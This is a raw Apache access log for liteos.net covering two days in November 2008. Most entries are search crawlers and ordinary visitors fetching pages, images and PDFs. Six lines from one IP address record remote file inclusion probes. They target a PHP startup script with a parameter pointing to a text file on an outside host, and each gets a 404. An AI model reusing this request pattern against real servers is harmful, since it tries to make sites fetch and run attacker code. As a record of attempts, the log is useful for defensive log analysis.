89.207.221.155 - - [01/Nov/2008:08:35:36 -0400] "GET /css/outer-box-bg.gif HTTP/1.1" 200 763 www.liteos.net "http://www.liteos.net/css/liteos.css" "Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3" "-"
89.207.221.155 - - [01/Nov/2008:08:35:37 -0400] "GET /img/liteos_banner.jpg HTTP/1.1" 200 90334 www.liteos.net "http://www.liteos.net/" "Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3" "-"
65.55.232.14 - - [01/Nov/2008:09:23:59 -0400] "GET /robots.txt HTTP/1.1" 404 2291 www.liteos.net "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" "-"
65.55.232.14 - - [01/Nov/2008:09:23:59 -0400] "GET /index.html HTTP/1.1" 301 247 www.liteos.net "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" "-"
67.195.37.93 - - [01/Nov/2008:09:38:20 -0400] "GET /robots.txt HTTP/1.0" 404 2291 www.liteos.net "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" "-"
67.195.37.93 - - [01/Nov/2008:09:38:21 -0400] "GET /info/download.html HTTP/1.0" 200 4914 www.liteos.net "-" "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)" "-"
67.195.37.93 - - [01/Nov/2008:09:38:21 -0400] "GET /css/liteos.css HTTP/1.0" 200 4971 www.liteos.net "http://www.liteos.net/info/download.html" "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)" "-"
119.63.193.55 - - [01/Nov/2008:10:08:46 -0400] "GET / HTTP/1.1" 200 7219 www.liteos.net "-" "Baiduspider+(+http://www.baidu.com/search/spider_jp.html)" "-"
91.121.153.195 - - [01/Nov/2008:11:48:47 -0400] "GET /robots.txt HTTP/1.1" 404 2291 www.liteos.net "-" "DiBot Java/1.5.0_04" "-"
91.121.153.195 - - [01/Nov/2008:11:48:49 -0400] "GET /docs/LiteOS_ApplicationNote102.pdf HTTP/1.1" 200 480263 www.liteos.net "http://www.diana-teknologia.com [xerka@diana-tek.com]" "Xerka WebBot v1.0.0 [ITI_UPV]" "-"
91.121.153.195 - - [01/Nov/2008:11:49:59 -0400] "GET /docs/LiteOS_ApplicationNote102.pdf HTTP/1.1" 200 166908 www.liteos.net "http://www.diana-teknologia.com [xerka@diana-tek.com]" "Xerka WebBot v1.0.0 [ITI_UPV]" "-"
208.80.194.36 - - [01/Nov/2008:12:01:43 -0400] "GET / HTTP/1.0" 200 7219 liteos.net "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; SpamBlockerUtility 4.8.0; .NET CLR 2.0.50727)" "-"
66.249.67.219 - - [01/Nov/2008:12:48:41 -0400] "GET /robots.txt HTTP/1.1" 404 2291 www.liteos.net "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.67.219 - - [01/Nov/2008:12:48:41 -0400] "GET / HTTP/1.1" 200 7219 www.liteos.net "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
201.78.88.143 - - [01/Nov/2008:13:03:23 -0400] "GET /info/news.html HTTP/1.1" 200 4886 www.liteos.net "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" "-"
208.115.111.250 - - [01/Nov/2008:13:07:17 -0400] "GET /robots.txt HTTP/1.1" 404 2291 www.liteos.net "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.dotnetdotcom.org/, crawler@dotnetdotcom.org)" "-"
66.249.67.219 - - [01/Nov/2008:13:14:21 -0400] "GET /index.html HTTP/1.1" 301 247 www.liteos.net "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.67.219 - - [01/Nov/2008:13:14:22 -0400] "GET /index.htm HTTP/1.1" 200 7219 www.liteos.net "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.67.219 - - [01/Nov/2008:13:32:41 -0400] "GET /docs/LiteOS_ApplicationNote102.pdf HTTP/1.1" 200 480263 www.liteos.net "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
208.115.111.250 - - [01/Nov/2008:13:38:20 -0400] "GET / HTTP/1.1" 200 7219 www.liteos.net "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.dotnetdotcom.org/, crawler@dotnetdotcom.org)" "-"
208.115.111.250 - - [01/Nov/2008:13:38:25 -0400] "GET /contact/contact.html HTTP/1.1" 200 8065 www.liteos.net "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.dotnetdotcom.org/, crawler@dotnetdotcom.org)" "-"
208.115.111.250 - - [01/Nov/2008:13:38:29 -0400] "GET /docs/docs.html HTTP/1.1" 200 10172 www.liteos.net "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.dotnetdotcom.org/, crawler@dotnetdotcom.org)" "-"
208.115.111.250 - - [01/Nov/2008:13:38:34 -0400] "GET /docs/faq.html HTTP/1.1" 200 11494 www.liteos.net "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.dotnetdotcom.org/, crawler@dotnetdotcom.org)" "-"
208.115.111.250 - - [01/Nov/2008:13:38:39 -0400] "GET /gallery/roadmap.html HTTP/1.1" 200 21486 www.liteos.net "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.dotnetdotcom.org/, crawler@dotnetdotcom.org)" "-"
208.115.111.250 - - [01/Nov/2008:13:38:43 -0400] "GET /gallery/screenshots.html HTTP/1.1" 200 5536 www.liteos.net "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.dotnetdotcom.org/, crawler@dotnetdotcom.org)" "-"
98.244.77.222 - - [01/Nov/2008:13:38:46 -0400] "GET /docs/IPSN_2008.pdf HTTP/1.1" 200 527541 www.liteos.net "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.30 Safari/525.13" "-"
98.244.77.222 - - [01/Nov/2008:13:38:47 -0400] "GET /favicon.ico HTTP/1.1" 200 3638 www.liteos.net "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.30 Safari/525.13" "-"
208.115.111.250 - - [01/Nov/2008:13:38:47 -0400] "GET /info/about.html HTTP/1.1" 200 6820 www.liteos.net "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.dotnetdotcom.org/, crawler@dotnetdotcom.org)" "-"
208.115.111.250 - - [01/Nov/2008:13:38:58 -0400] "GET /info/download.html HTTP/1.1" 200 4914 www.liteos.net "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.dotnetdotcom.org/, crawler@dotnetdotcom.org)" "-"
208.115.111.250 - - [01/Nov/2008:13:39:03 -0400] "GET /info/download.html. HTTP/1.1" 301 256 www.liteos.net "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.dotnetdotcom.org/, crawler@dotnetdotcom.org)" "-"
208.115.111.250 - - [01/Nov/2008:13:39:08 -0400] "GET /info/news.html HTTP/1.1" 200 4886 www.liteos.net "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.dotnetdotcom.org/, crawler@dotnetdotcom.org)" "-"
208.115.111.250 - - [01/Nov/2008:13:42:15 -0400] "GET /info/people.html HTTP/1.1" 200 10363 www.liteos.net "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.dotnetdotcom.org/, crawler@dotnetdotcom.org)" "-"
119.63.193.55 - - [01/Nov/2008:14:07:06 -0400] "GET / HTTP/1.1" 200 7219 www.liteos.net "-" "Baiduspider+(+http://www.baidu.com/search/spider_jp.html)" "-"
66.235.124.40 - - [01/Nov/2008:14:23:20 -0400] "GET /robots.txt HTTP/1.0" 404 2291 www.liteos.net "-" "Mozilla/5.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)" "-"
66.235.124.40 - - [01/Nov/2008:14:23:20 -0400] "GET /info/news.html HTTP/1.0" 200 4886 www.liteos.net "-" "Mozilla/5.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)" "-"
84.121.86.241 - - [01/Nov/2008:14:52:25 -0400] "GET /img/icon.jpg HTTP/1.1" 200 90334 www.liteos.net "-" "Mozilla/3.0 (compatible; Indy Library)" "-"
64.1.215.162 - - [01/Nov/2008:17:23:09 -0400] "GET /robots.txt HTTP/1.0" 404 2291 www.liteos.net "-" "Mozilla/5.0 (Twiceler-0.9 http://www.cuil.com/twiceler/robot.html)" "-"
119.63.193.55 - - [01/Nov/2008:18:05:55 -0400] "GET / HTTP/1.1" 200 7219 www.liteos.net "-" "Baiduspider+(+http://www.baidu.com/search/spider_jp.html)" "-"
119.63.193.56 - - [01/Nov/2008:20:34:18 -0400] "GET /robots.txt HTTP/1.1" 404 2291 www.liteos.net "-" "Baiduspider+(+http://www.baidu.com/search/spider_jp.html)" "-"
119.63.193.55 - - [01/Nov/2008:22:06:30 -0400] "GET / HTTP/1.1" 200 7219 www.liteos.net "-" "Baiduspider+(+http://www.baidu.com/search/spider_jp.html)" "-"
121.14.222.180 - - [02/Nov/2008:00:53:07 -0400] "GET /info/download.html HTTP/1.1" 200 4914 www.liteos.net "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)" "-"
200.93.147.155 - - [02/Nov/2008:01:54:18 -0400] "GET /docs//modules/kernel/system/startup.php?CFG_PHPGIGGLE_ROOT=http://www.atfederacion.com.ar/fx29id.txt??? HTTP/1.1" 404 2320 www.liteos.net "-" "Mozilla/5.0" "-"
200.93.147.155 - - [02/Nov/2008:01:54:18 -0400] "GET /docs/IPSN_2008_Demopaper.pdf//modules/kernel/system/startup.php?CFG_PHPGIGGLE_ROOT=http://www.atfederacion.com.ar/fx29id.txt??? HTTP/1.1" 404 2344 www.liteos.net "-" "Mozilla/5.0" "-"
200.93.147.155 - - [02/Nov/2008:01:54:54 -0400] "GET /docs//modules/kernel/system/startup.php?CFG_PHPGIGGLE_ROOT=http://www.atfederacion.com.ar/fx29id.txt??? HTTP/1.1" 404 2320 www.liteos.net "-" "Mozilla/5.0" "-"
200.93.147.155 - - [02/Nov/2008:01:54:54 -0400] "GET /docs/IPSN_2008_Demopaper.pdf//modules/kernel/system/startup.php?CFG_PHPGIGGLE_ROOT=http://www.atfederacion.com.ar/fx29id.txt??? HTTP/1.1" 404 2344 www.liteos.net "-" "Mozilla/5.0" "-"
200.93.147.155 - - [02/Nov/2008:01:01:05 -0500] "GET /docs//modules/kernel/system/startup.php?CFG_PHPGIGGLE_ROOT=http://www.atfederacion.com.ar/fx29id.txt??? HTTP/1.1" 404 2320 www.liteos.net "-" "Mozilla/5.0" "-"
200.93.147.155 - - [02/Nov/2008:01:01:05 -0500] "GET /docs/IPSN_2008_Demopaper.pdf//modules/kernel/system/startup.php?CFG_PHPGIGGLE_ROOT=http://www.atfederacion.com.ar/fx29id.txt??? HTTP/1.1" 404 2344 www.liteos.net "-" "Mozilla/5.0" "-"
119.63.193.55 - - [02/Nov/2008:01:07:27 -0500] "GET / HTTP/1.1" 200 7219 www.liteos.net "-" "Baiduspider+(+http://www.baidu.com/search/spider_jp.html)" "-"
119.63.193.55 - - [02/Nov/2008:05:08:58 -0500] "GET / HTTP/1.1" 200 7219 www.liteos.net "-" "Baiduspider+(+http://www.baidu.com/search/spider_jp.html)" "-"
66.235.124.40 - - [02/Nov/2008:05:37:19 -0500] "GET /robots.txt HTTP/1.0" 404 2291 www.liteos.net "-" "Mozilla/5.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)" "-"
66.235.124.40 - - [02/Nov/2008:05:37:19 -0500] "GET /gallery/screenshots.html HTTP/1.0" 200 5536 www.liteos.net "-" "Mozilla/5.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)" "-"
119.63.193.55 - - [02/Nov/2008:09:06:22 -0500] "GET / HTTP/1.1" 200 7219 www.liteos.net "-" "Baiduspider+(+http://www.baidu.com/search/spider_jp.html)" "-"
208.80.194.33 - - [02/Nov/2008:10:55:05 -0500] "GET / HTTP/1.0" 200 7219 www.liteos.net "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SIMBAR={1E7BF500-9169-4ed5-9A7B-91AAEE8F366C}; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" "-"
86.163.172.58 - - [02/Nov/2008:11:23:41 -0500] "GET /info/people.html HTTP/1.1" 200 10363 www.liteos.net "http://www.google.co.uk/search?hl=en&q=liteos&btnG=Google+Search&meta=" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3" "-"
86.163.172.58 - - [02/Nov/2008:11:23:42 -0500] "GET /css/liteos.css HTTP/1.1" 200 4971 www.liteos.net "http://www.liteos.net/info/people.html" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3" "-"
86.163.172.58 - - [02/Nov/2008:11:23:42 -0500] "GET /css/outer-box-bg.gif HTTP/1.1" 200 763 www.liteos.net "http://www.liteos.net/css/liteos.css" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3" "-"
86.163.172.58 - - [02/Nov/2008:11:23:42 -0500] "GET /css/hr_gray.png HTTP/1.1" 200 132 www.liteos.net "http://www.liteos.net/css/liteos.css" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3" "-"
86.163.172.58 - - [02/Nov/2008:11:23:44 -0500] "GET /img/icon.jpg HTTP/1.1" 200 90334 www.liteos.net "http://www.liteos.net/info/people.html" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3" "-"
86.163.172.58 - - [02/Nov/2008:11:23:44 -0500] "GET /favicon.ico HTTP/1.1" 200 3638 www.liteos.net "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3" "-"
119.63.193.56 - - [02/Nov/2008:11:59:33 -0500] "GET /robots.txt HTTP/1.1" 404 2291 www.liteos.net "-" "Baiduspider+(+http://www.baidu.com/search/spider_jp.html)" "-"
119.63.193.55 - - [02/Nov/2008:13:06:43 -0500] "GET / HTTP/1.1" 200 7219 www.liteos.net "-" "Baiduspider+(+http://www.baidu.com/search/spider_jp.html)" "-"
67.195.37.93 - - [02/Nov/2008:14:01:21 -0500] "GET /robots.txt HTTP/1.0" 404 2291 www.liteos.net "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" "-"
67.195.37.93 - - [02/Nov/2008:14:01:22 -0500] "GET /info/about.html HTTP/1.0" 200 6820 www.liteos.net "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" "-"
67.195.37.93 - - [02/Nov/2008:14:26:13 -0500] "GET /info/people.html HTTP/1.0" 200 10363 www.liteos.net "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" "-"
189.74.20.98 - - [02/Nov/2008:14:30:12 -0500] "GET /info/news.html HTTP/1.1" 200 4886 www.liteos.net "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" "-"
130.245.205.142 - - [02/Nov/2008:15:23:12 -0500] "GET / HTTP/1.1" 200 7219 www.liteos.net "http://www.cs.uiuc.edu/homes/zaher/cyberphysical/" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3" "-"
130.245.205.142 - - [02/Nov/2008:15:23:13 -0500] "GET /favicon.ico HTTP/1.1" 200 3638 www.liteos.net "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3" "-"
130.245.205.142 - - [02/Nov/2008:15:23:13 -0500] "GET /css/liteos.css HTTP/1.1" 200 4971 www.liteos.net "http://www.liteos.net/" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3" "-"
130.245.205.142 - - [02/Nov/2008:15:23:13 -0500] "GET /css/outer-box-bg.gif HTTP/1.1" 200 763 www.liteos.net "http://www.liteos.net/css/liteos.css" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3" "-"
130.245.205.142 - - [02/Nov/2008:15:23:13 -0500] "GET /img/liteos_banner.jpg HTTP/1.1" 200 90334 www.liteos.net "http://www.liteos.net/" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3" "-"
67.195.37.93 - - [02/Nov/2008:15:52:07 -0500] "GET /docs/docs.html HTTP/1.0" 200 10172 www.liteos.net "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" "-"
67.195.37.93 - - [02/Nov/2008:15:54:33 -0500] "GET /docs/IPSN_2008.pdf HTTP/1.0" 200 527541 www.liteos.net "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" "-"
66.235.124.40 - - [02/Nov/2008:16:50:48 -0500] "GET / HTTP/1.0" 200 7219 www.liteos.net "-" "Mozilla/5.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)" "-"
119.63.193.55 - - [02/Nov/2008:17:05:19 -0500] "GET / HTTP/1.1" 200 7219 www.liteos.net "-" "Baiduspider+(+http://www.baidu.com/search/spider_jp.html)" "-"
67.195.37.93 - - [02/Nov/2008:17:23:05 -0500] "GET /docs/RTSS_2008.pdf HTTP/1.0" 200 302743 www.liteos.net "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" "-"
67.195.37.93 - - [02/Nov/2008:17:34:15 -0500] "GET /docs/LiteOS_Programming_Guide.pdf HTTP/1.0" 200 809080 www.liteos.net "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" "-"
202.197.8.3 - - [02/Nov/2008:19:53:41 -0500] "GET / HTTP/1.1" 200 7219 www.liteos.net "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; TheWorld)" "-"
61.187.54.9 - - [02/Nov/2008:19:53:42 -0500] "GET /css/liteos.css HTTP/1.1" 200 4971 www.liteos.net "http://www.liteos.net/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; TheWorld)" "-"
202.197.8.3 - - [02/Nov/2008:19:53:42 -0500] "GET /css/outer-box-bg.gif HTTP/1.1" 200 763 www.liteos.net "http://www.liteos.net/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; TheWorld)" "-"
202.197.8.3 - - [02/Nov/2008:19:53:45 -0500] "GET /img/liteos_banner.jpg HTTP/1.1" 200 90334 www.liteos.net "http://www.liteos.net/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; TheWorld)" "-"
202.197.8.3 - - [02/Nov/2008:19:54:27 -0500] "GET /docs/docs.html HTTP/1.1" 200 10172 www.liteos.net "http://www.liteos.net/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; TheWorld)" "-"
202.197.8.3 - - [02/Nov/2008:19:54:28 -0500] "GET /css/li-brown.png HTTP/1.1" 200 141 www.liteos.net "http://www.liteos.net/docs/docs.html" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; TheWorld)" "-"
222.240.178.20 - - [02/Nov/2008:19:54:28 -0500] "GET /css/hr_gray.png HTTP/1.1" 200 132 www.liteos.net "http://www.liteos.net/docs/docs.html" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; TheWorld)" "-"
61.187.54.9 - - [02/Nov/2008:19:54:29 -0500] "GET /img/icon.jpg HTTP/1.1" 200 90334 www.liteos.net "http://www.liteos.net/docs/docs.html" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; TheWorld)" "-"
202.197.8.3 - - [02/Nov/2008:19:57:43 -0500] "GET /docs/RTSS_2008.pdf HTTP/1.1" 200 302743 www.liteos.net "http://www.liteos.net/docs/docs.html" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; )" "-"
66.235.124.40 - - [02/Nov/2008:19:58:41 -0500] "GET /robots.txt HTTP/1.0" 404 2291 www.liteos.net "-" "Mozilla/5.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)" "-"
66.235.124.40 - - [02/Nov/2008:19:58:41 -0500] "GET /info/people.html HTTP/1.0" 200 10363 www.liteos.net "-" "Mozilla/5.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)" "-"
119.63.193.55 - - [02/Nov/2008:21:06:11 -0500] "GET / HTTP/1.1" 200 7219 www.liteos.net "-" "Baiduspider+(+http://www.baidu.com/search/spider_jp.html)" "-"
65.55.232.14 - - [02/Nov/2008:22:29:37 -0500] "GET /robots.txt HTTP/1.1" 404 2291 www.liteos.net "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" "-"
65.55.232.14 - - [02/Nov/2008:22:29:38 -0500] "GET /info/news.html HTTP/1.1" 200 4886 www.liteos.net "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" "-"
65.55.232.14 - - [02/Nov/2008:22:29:38 -0500] "GET /contact/contact.html HTTP/1.1" 304 - www.liteos.net "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" "-"
